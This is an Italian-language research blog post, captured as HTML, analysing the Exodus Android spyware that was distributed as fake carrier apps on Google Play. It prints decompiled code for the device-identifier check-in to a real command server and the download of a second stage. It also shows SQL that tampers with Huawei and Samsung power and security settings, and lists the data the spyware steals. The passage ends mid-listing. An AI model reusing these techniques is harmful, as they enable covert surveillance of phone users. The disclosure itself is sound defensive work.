<!doctype html> <html lang=en> <head> <meta content="IE=edge" http-equiv=X-UA-Compatible> <meta charset=utf-8> <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name=viewport> <link rel="shortcut icon" href="favicon.png"/> <link rel=icon type="image/ico" href="favicon.ico"/> <link rel=stylesheet href="/fonts/fontawesome/css/all.css"> <title>Security Without Borders</title> <link href="/stylesheets/site.css" rel=stylesheet /> <style>
    @font-face {
        font-family: "Roboto Slab";
        src: url("/fonts/roboto/RobotoSlab-Regular.ttf") format("truetype");
    }
    h1, h2, h3, h4 {
        font-family: "Roboto Slab", serif;
    }
    </style> </head> <body class="blog blog_2019 blog_2019_03 blog_2019_03_29 blog_2019_03_29_exodus-ita"> <header class=is-text-white> <div class="group flex header-content"> <div class=logo-container> <a href="/"> <img src="/images/logo.png" alt=logo class=logo /> </a> </div> <nav class="flex-2 is-text-align-center"> <a href="/resources.html"><i class="fas fa-book"></i> Resources</a> <a href="/tools.html"><i class="fas fa-wrench"></i> Tools</a> <a href="/blog.html"><i class="fas fa-newspaper"></i> Blog</a> <a href="/donate.html"><i class="fas fa-hand-holding-heart"></i> Donate</a> </nav> </div> </header> <main class=group> <section class="group main-container is-bg-white first flex"> <article class="container blog-post"> <h1>Exodus: Nuovo Spyware per Android Made in Italy</h1> <h3>Mar 29</h3> <p><a href="https://securitywithoutborders.org/blog/2019/03/29/exodus.html">Click here for the English version</a></p> <p><em>Disclaimer: questa ricerca Ã¨ stata condotta da membri e associati di Security Without Borders, indipendentemente da qualsiasi altra affiliazione o datore di lavoro.</em></p> <h2>Sommario</h2> <ul> <li>Abbiamo identificato una nuova famiglia di spyware per Android che abbiamo nominato <strong>Exodus</strong> e che si compone di due stage che identifichiamo in questo rapporto come <strong>Exodus One</strong> e <strong>Exodus Two</strong>. Abbiamo raccolto numerose copie di questo spyware, generate ed utilizzate tra il 2016 all&#39;inizio del 2019.</li> <li>Copie di questo sono state trovate caricate sul Google Play Store, camuffate da applicazioni di servizio di operatori telefonici. Sia le pagine di Google Play Store che le finte interfacce di queste applicazioni malevole sono in Italiano. Secondo le statistiche pubblicamente disponibili, in aggiunta ad una conferma di Google, <strong>la maggior parte di queste applicazioni hanno raccolto qualche decina di installazioni ciascuna, con un caso che superava le 350 unitÃ . Tutte le vittime si trovano in Italia</strong>. Le pagine Google Play Store e le relative applicazioni malevole sono state disabilitate da Google.</li> <li>Riteniamo che questa piattaforma spyware sia stata sviluppata da una societÃ  Italiana chiamata <strong>eSurv</strong>, di Catanzaro, che opera principalmente nel settore della videosorveglianza. Secondo informazioni disponibili pubblicamente sembra che eSurv abbia iniziato a sviluppare spyware dal 2016.</li> <li>Exodus Ã¨ dotato di ampie capacitÃ  di raccolta e di intercettazione. Ã particolarmente preoccupante che <strong>alcune delle modifiche effettuate dallo spyware potrebbero esporre i dispositivi infetti a ulteriori compromissioni o a manomissioni dei dati</strong>.</li> </ul> <h2>Spyware Camuffato e Caricato su Google Play Store</h2> <p>Abbiamo identificato copie di uno spyware precedentemente sconosciuto che sono state caricate con successo sul Google Play Store piÃ¹ volte nel corso di oltre due anni. Queste applicazioni sono normalmente rimaste disponibili su Play Store per mesi.</p> <p>Anche se con diverse variazioni, tutte le copie identificate di questo spyware condividono un camuffamento simile. Nella maggior parte dei casi sono stati creati per apparire come applicazioni distribuite da generici operatori mobili in Italia. Spesso la descrizione dell&#39;applicazione sul Play Store fa riferimento a messaggi SMS che i target avrebbero ricevuto e che li avrebbero condotti ad una pagina sul Play Store. Tutte le pagine sul Play Store che abbiamo identificato e tutte le interfacce grafiche usate per camuffare le applicazioni stesse sono scritte in Italiano.</p> <p><img src="/images/esurv/playstore1.png" class="rounded-lg shadow-lg"/></p> <p><img src="/images/esurv/playstore2.png" class="rounded-lg shadow-lg mb-4"/></p> <p>Secondo Google, che abbiamo contattato per segnalare le nostre scoperte, quasi 25 varianti di questo spyware sono state caricate sul Google Play Store. Google Play ha rimosso le applicazioni e ha dichiarato in una comunicazione via email che <em>&quot;grazie a modelli di rilevamento avanzati, Google Play Protect sarÃ  ora in grado di rilevare meglio le future varianti di queste applicazioni&quot;</em>.</p> <p>Mentre Google non ha condiviso con noi il numero totale di dispositivi infetti, ha confermato che una di queste applicazioni malevole ha raccolto oltre 350 installazioni attraverso il Play Store, mentre altre varianti hanno raccolto poche decine ciascuna, e che tutte le infezioni sono state localizzate in Italia. Abbiamo direttamente osservato <a href="https://archive.fo/omfJ8">molteplici</a> <a href="https://archive.fo/lzDTN">copie</a> di Exodus con <a href="https://archive.fo/8KYG7">piÃ¹ di 50 installazioni</a> e <strong>possiamo stimare approssimativamente che il numero totale di infezioni ammonti a diverse centinaia, se non un migliaio o piÃ¹</strong>. </p> <h2>Primo Stage: <em>Exodus One</em></h2> <p>Il primo stage, installato scaricando le applicazioni malevole caricate su Google Play Store, funziona semplicemente da <em>dropper</em>. Di seguito sono riportati alcuni esempi delle finte interfacce grafiche utilizzate da queste applicazioni:</p> <div class="float-left mb-8"><img src="/images/esurv/phone2.png" class=mr-6 width=300px /> <img src="/images/esurv/phone3.png" width=300px /></div><div class=clearfix></div> <p>Lo scopo di <em>Exodus One</em> sembra essere quello di raccogliere alcune informazioni di base di identificazione del dispositivo infetto (in particolare il codice IMEI ed il numero di telefono) e inviarlo al server di Command &amp; Control. Questo Ã¨ talvolta fatto per verificare la validitÃ  di una infezione. CiÃ² Ã¨ ulteriormente corroborato da alcune copie piÃ¹ vecchie e non offuscate generate nel 2016, le cui classi primarie sono chiamate <code>CheckValidTarget</code>.</p> <p>Durante i nostri test <strong>lo spyware Ã¨ stato aggiornato allo stage two sui nostri dispositivi di test immediatamente dopo il primo check-in.</strong> Questo suggerisce che gli operatori del Command &amp; Control non stanno applicando una validazione dei target. Inoltre, <strong>durante un periodo di diversi giorni, i nostri dispositivi di test infetti non sono mai stati disinfettati in remoto dagli operatori</strong>.</p> <p>Per il fine di questo rapporto analizziamo qui in particolare il campione di <em>Exodus One</em> con hash <code>8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884</code> che comunica con il server di Command &amp; Control all&#39;indirizzo <code>54.71.249.137</code>. Altre copie comunicano con altri server elencati in fondo a questo rapporto. <em>Exodus One</em> effettua il check-in inviando una richiesta POST contenente il package name dell&#39;applicazione, l&#39;IMEI del dispositivo e un body crittografato contenente informazioni aggiuntive sul dispositivo.</p> <div class=highlight><pre class="highlight plaintext"><code>POST /eddd0317-2bdc-4140-86cb-0e8d7047b874 HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
Content-Type: application/octet-stream
Content-Length: 256
Host: 54.71.249.137
Connection: Keep-Alive
Accept-Encoding: gzip

.....,Q... N.v..us.R.........../...\D..5p..q    ......4

[REDACTED]

gl.O..Y.Q..)3...7K.:(..5...w..........L.....p.L2......._jK..............g}...15......r.x.x!.....?..O.z......

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: [REDACTED]
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

358fde5fe8f91b132636a6d5a7148070
</code></pre></div> <p>Il contenuto della richiesta Ã¨ composto da vari identificatori concatenati con cancelletti:</p> <div class=highlight><pre class="highlight java"><code><span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" "</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">deviceId</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">str</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line1Number</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"##"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">subscriberId</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">networkOperatorName</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">networkType</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"#"</span><span class="o">);</span>
<span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">simState</span><span class="o">);</span>
</code></pre></div> <p>La funzione <code>doFinal()</code> Ã¨ poi chiamata per cifrare la stringa generata:</p> <div class=highlight><pre class="highlight java"><code><span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">doFinal</span> <span class="o">=</span> <span class="n">a3</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
</code></pre></div> <p>La stringa di User-Agent Ã¨ costruita concatenando il package name ed il numero IMEI del dispositivo:</p> <div class=highlight><pre class="highlight java"><code><span class="n">stringBuilder2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">e</span><span class="o">.</span><span class="na">getPackageName</span><span class="o">());</span>
<span class="n">stringBuilder2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">":"</span><span class="o">);</span>
<span class="n">stringBuilder2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">deviceId</span><span class="o">);</span>
<span class="n">subscriberId</span> <span class="o">=</span> <span class="n">stringBuilder2</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</code></pre></div> <p>Infine, la richiesta HTTP Ã¨ mandata al server <code>https://54.71.249.137/eddd0317-2bdc-4140-86cb-0e8d7047b874</code>. Molte delle stringhe nell&#39;applicazione sono offuscate con XOR con la chiave <code>Kjk1MmphFG</code>:</p> <div class=highlight><pre class="highlight java"><code><span class="n">StringBuilder</span> <span class="n">stringBuilder3</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
<span class="n">stringBuilder3</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"https://"</span><span class="o">);</span>
<span class="n">stringBuilder3</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
<span class="n">stringBuilder3</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"/"</span><span class="o">);</span>
<span class="n">stringBuilder3</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">"Lg4PVX1eQV9rdSkOCBx5XERYa399CQkcfQhIDHF3f10JCXpZ"</span><span class="o">));</span>
<span class="kd">final</span> <span class="n">Request</span> <span class="n">build</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">url</span><span class="o">(</span><span class="n">stringBuilder3</span><span class="o">.</span><span class="na">toString</span><span class="o">()).</span><span class="na">header</span><span class="o">(</span><span class="s">"User-Agent"</span><span class="o">,</span> <span class="n">subscriberId</span><span class="o">).</span><span class="na">post</span><span class="o">(</span><span class="n">create</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
</code></pre></div> <p>Dopo alcune altre, <em>Exodus One</em> compie una richiesta POST a <code>https://54.71.249.137/56e087c9-fc56-49bb-bbd0-4fafc4acd6e1</code> che ritorna un archivio Zip contenente i binari che compongono il secondo stage.</p> <div class=highlight><pre class="highlight plaintext"><code>POST /56e087c9-fc56-49bb-bbd0-4fafc4acd6e1 HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
Content-Type: application/octet-stream
Content-Length: 256
Host: 54.71.249.137
Connection: Keep-Alive
Accept-Encoding: gzip

......#f......Ri.)"S.d,....xT...(.L...1.6I.KW9n...Cc@.;....u..4.k...
".d...W

[REDACTED]

%.+Y..k..}..I....!z...5G...-(.]fc.V..&lt;[y...T..s}.{......u%..[.!89...m..

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Fri, 18 Jan 2019 13:19:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

PK.........e[L@..c4'...T......null_armUT    ...D.ZxD.Zux..............|}|....y.%...O`.....f..0..)..P..
</code></pre></div> <h2>Secondo Stage: <em>Exodus Two</em></h2> <p>L&#39;archivio Zip restituito dal check-in effettuato da <em>Exodus One</em> Ã¨ una raccolta di file contenenti il payload primario <code>mike.jar</code> e diverse utilities compilate che svolgono diverse funzioni. Almeno nelle versioni piÃ¹ recenti, a partire da gennaio 2019, l&#39;archivio Zip conterrebbe effettivamente le versioni i686, arm e arm64 di tutti i binari distribuiti.</p> <table><thead> <tr> <th>Nome di File</th> <th>Data di Modifica</th> <th>SHA256</th> </tr> </thead><tbody> <tr> <td>null_arm</td> <td>2018-02-27 06:44:00</td> <td>48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88</td> </tr> <tr> <td>null_i686</td> <td>2018-02-27 06:44:00</td> <td>c228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658</td> </tr> <tr> <td>null_arm64</td> <td>2018-02-27 06:43:00</td> <td>48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88</td> </tr> <tr> <td>sepolicy-inject_arm</td> <td>2019-01-08 04:55:00</td> <td>47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8</td> </tr> <tr> <td>sepolicy-inject_arm64</td> <td>2019-01-08 04:55:00</td> <td>824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a</td> </tr> <tr> <td>sepolicy-inject_i686</td> <td>2019-01-08 04:55:00</td> <td>13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6</td> </tr> <tr> <td>rootdaemon_arm</td> <td>2019-01-08 04:55:00</td> <td>00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4</td> </tr> <tr> <td>rootdaemon_arm64</td> <td>2019-01-08 04:55:00</td> <td>3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5</td> </tr> <tr> <td>mike.jar</td> <td>2018-12-06 05:50:00</td> <td>a42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e</td> </tr> <tr> <td>rootdaemon_i686</td> <td>2019-01-08 04:55:00</td> <td>b46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7</td> </tr> <tr> <td>zygote<em>daemon</em>arm</td> <td>2019-01-08 04:55:00</td> <td>e3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f</td> </tr> <tr> <td>zygote<em>daemon</em>arm64</td> <td>2019-01-08 04:55:00</td> <td>11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59</td> </tr> <tr> <td>zygote<em>daemon</em>i686</td> <td>2019-01-08 04:55:00</td> <td>3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33</td> </tr> <tr> <td>sapp.apk</td> <td>2019-01-08 04:53:00</td> <td>4bf1446c412dd5c552539490d03e999a6ceb96ae60a9e7846427612bec316619</td> </tr> <tr> <td>placeholder</td> <td>2018-03-29 16:31:00</td> <td>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</td> </tr> </tbody></table> <p>Dopo il download, <em>Exodus One</em> carica dinamicamente ed esegue il payload primario <code>mike.jar</code> utilizzando l&#39;API Android <a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">DexClassLoader()</a>. <code>mike.jar</code> implementa la maggior parte delle funzionalitÃ  di raccolta dati e di filtraggio di questo spyware.</p> <p>Dei vari binari scaricati, i piÃ¹ interessanti sono <code>null</code>, che funge da terminale locale e remoto, e <code>rootdaemon</code>, che si occupa dell&#39;escalation dei privilegi e dell&#39;acquisizione dati. Il <code>rootdaemon</code> tenterÃ  in primo luogo un jailbreak del dispositivo usando una versione modificata dell&#39;exploit DirtyCow.</p> <p>Analogamente ad un altro spyware Android di fattura Italiana, originariamente scoperto da <a href="https://twitter.com/LukasStefanko/status/928548460332290048">Lukas Stefanko</a> e piÃ¹ tardi nominato <a href="https://securelist.com/skygofree-following-in-the-footsteps-of-hackingteam/83603/">Skygofree</a> ed analizzato nel dettaglio da Kaspersky Labs, anche Exodus si avvale di &quot;protectedapps&quot;, una caratteristica dei telefoni Huawei che permette di configurare opzioni di risparmio energetico per le applicazioni in esecuzione. Manipolando un database SQLite, Exodus Ã¨ in grado di mantenersi in funzione anche quando lo schermo si spegne e l&#39;applicazione verrebbe altrimenti sospesa per ridurre il consumo della batteria.</p> <div class=highlight><pre class="highlight java"><code><span class="k">if</span> <span class="o">(</span> <span class="o">!</span><span class="n">func_sqlite_loaddb</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="s">"/data/data/com.huawei.systemmanager/databases/Optimize.db"</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)&amp;</span><span class="n">db_handle</span><span class="o">)</span> <span class="o">)</span>
<span class="o">{</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')"</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"DELETE FROM backgroundwhiteapps WHERE package_name='%s'"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"INSERT INTO backgroundwhiteapps (package_name) VALUES ('%s')"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">func_sqlite_free</span><span class="o">(</span><span class="n">v4</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div><div class=highlight><pre class="highlight java"><code><span class="k">if</span> <span class="o">(</span> <span class="o">!</span><span class="n">func_sqlite_loaddb</span><span class="o">(</span>
        <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="s">"/data/user_de/0/com.huawei.systemmanager/databases/smartpowerprovider.db"</span><span class="o">,</span>
        <span class="o">(</span><span class="kt">int</span><span class="o">)&amp;</span><span class="n">db_handle</span><span class="o">)</span> <span class="o">)</span>
<span class="o">{</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')"</span><span class="o">,</span> <span class="n">v2</span><span class="o">,</span> <span class="n">a2</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"DELETE FROM rogueapps WHERE pkgname='%s'"</span><span class="o">,</span> <span class="n">v2</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"DELETE FROM superpowerapps WHERE pkgname='%s'"</span><span class="o">,</span> <span class="n">v2</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"REPLACE INTO unifiedpowerapps (pkg_name,is_protected,is_show,is_changed) VALUES ('%s',1,0,0)"</span><span class="o">,</span> <span class="n">v2</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="o">);</span>
    <span class="n">func_sqlite_free</span><span class="o">(</span><span class="n">v5</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div> <p>Inoltre, <code>rootdaemon</code> cerca di rimuovere le proprie statistiche sul consumo energetico dal SystemManager di telefoni Huawei:</p> <div class=highlight><pre class="highlight java"><code><span class="k">if</span> <span class="o">(</span> <span class="o">!</span><span class="n">func_sqlite_loaddb</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="s">"/data/data/com.huawei.systemmanager/databases/stusagestat.db"</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)&amp;</span><span class="n">db_handle</span><span class="o">)</span> <span class="o">)</span>
<span class="o">{</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"REPLACE INTO default_value_table (pkg_name,control,protect,keytask) VALUES ('%s',0,2,0)"</span><span class="o">,</span> <span class="n">v1</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"DELETE FROM st_key_procs_table WHERE st_key_process='%s'"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"INSERT INTO st_key_procs_table (st_key_process) VALUES ('%s')"</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">sprintf</span><span class="o">(&amp;</span><span class="n">s</span><span class="o">,</span> <span class="s">"REPLACE INTO st_protected_pkgs_table (pkg_name,is_checked) VALUES ('%s',1)"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
    <span class="n">func_sqlite_exec</span><span class="o">(</span><span class="n">db_handle</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="o">);</span>
    <span class="n">func_sqlite_free</span><span class="o">(</span><span class="n">v4</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div> <p>Allo stesso modo, l&#39;applicazione dannosa probabilmente tenta di minimizzare le tracce sui telefoni Samsung aggiungendo al file <code>/data/data/com.samsung.android.securitylogagent/shared_prefs/apm_sp_status_of_apps.xml</code> le seguenti stringhe:</p> <div class=highlight><pre class="highlight xml"><code><span class="cp">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</span>
<span class="nt">&lt;map&gt;</span>
    <span class="nt">&lt;int</span> <span class="na">name=</span><span class="s">\"[APP</span> <span class="err">NAME]\"</span> <span class="na">value=</span><span class="s">\"33554499\"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/map&gt;</span>
</code></pre></div> <p>Ed aggiunge al file <code>/data/data/com.samsung.android.securitylogagent/shared_prefs/com.samsung.android.securitylogagent_preferences.xml</code> le seguenti:</p> <div class=highlight><pre class="highlight xml"><code><span class="cp">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</span>
<span class="nt">&lt;map&gt;</span>
    <span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">\"[APP</span> <span class="err">NAME]\"</span> <span class="na">value=</span><span class="s">\"false\"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/map&gt;</span>
</code></pre></div> <h3>Collezione ed Esfiltrazione di Dati</h3> <p>Come accennato, <code>mike.jar</code> fornisce lo spyware con ampie capacitÃ  di raccolta dati, tra cui:</p> <ul> <li>Recuperare una lista di applicazioni installate.</li> <li>Registrare l&#39;audio dell&#39;ambiente circostante in formato 3gp utilizzando il microfono incorporato.</li> <li>Recuperare la cronologia di navigazione e i segnalibri da Chrome e SBrowser (il browser fornito con i telefoni Samsung).</li> <li>Estrarre gli eventi dall&#39;app Calendario.</li> <li>Estrarre il registro delle chiamate.</li> <li>Registrare le chiamate telefoniche audio in formato 3gp.</li> <li>Scattare foto con la fotocamera incorporata.</li> <li>Raccogliere informazioni sulle celle telefoniche circostanti (BTS).</li> <li>Estrarre la rubrica.</li> <li>Estrarre l&#39;elenco dei contatti dall&#39;applicazione Facebook.</li> <li>Estrarre i log dalle conversazioni di Facebook Messenger.</li> <li>Prendere uno screenshot di qualsiasi applicazione in primo piano.</li> <li>Estrarre informazioni sulle immagini dalla Galleria.</li> <li>Estrarre informazioni dall&#39;applicazione GMail.</li> <li>Scaricare i dati dall&#39;app Messenger dell&#39;IMO.</li> <li>Estrarre registri di chiamate, i contatti e messaggi dall&#39;app Skype.</li> <li>Recuperare tutti i messaggi SMS.</li> <li>Estrarre i messaggi e la chiave di crittografia dall&#39;app Telegram.</li> <li>Scaricare i dati dall&#39;app Viber Messenger.</li> <li>Estrarre i log da WhatsApp.</li> <li>Recuperare i file multimediali scambiati tramite WhatsApp.</li> <li>Estrarre la password della rete Wi-Fi.</li> <li>Estrarre i dati dall&#39;applicazione WeChat.</li> <li>Estrarre le coordinate GPS correnti del telefono.</li> </ul> <p>Mentre alcune di queste acquisizioni vengono eseguite esclusivamente tramite codice in <code>mike.jar</code>, altre che richiedono l&#39;accesso, ad esempio, a database SQLite o altri file nella memoria dell&#39;applicazione vengono invece eseguite tramite <code>rootdaemon</code>, che dovrebbe essere eseguito con privilegi di root. Per ottenere questo, <code>mike.jar</code> si collega al <code>rootdaemon</code> attraverso varie porte TCP che il demone lega ad alcune routine di estrazione per applicazioni supportate:</p> <ul> <li>Porta 6202: Servizio di estrazione dati da WhatsApp.</li> <li>Porte 6203 e 6204: Servizio di estrazione dati da Facebook.</li> <li>Porta 6205: Servizio di estrazione dati da Gmail.</li> <li>Porta 6206: Servizio di estrazione dati da Skype.</li> <li>Porta 6207: Servizio di estrazione dati da Viber.</li> <li>Porto 6208: Servizio di estrazione dati da IMO.</li> <li>Porto 6209: Servizio di estrazione dati da Telegram.</li> <li>Porto 6210: servizio di estrazione dati da SBrowser.</li> <li>Porto 6211: servizio di estrazione dati da Calendar.</li> <li>Porto 6212: servizio di estrazione dati da Chrome.</li> </ul> <p>Questi servizi sembrano essere esposti su tutte le interfacce di rete e sono quindi accessibili a chiunque condivida una rete locale con un dispositivo infetto.</p> <div class=highlight><pre class="highlight shell"><code> tcp       0      0 0.0.0.0:6201           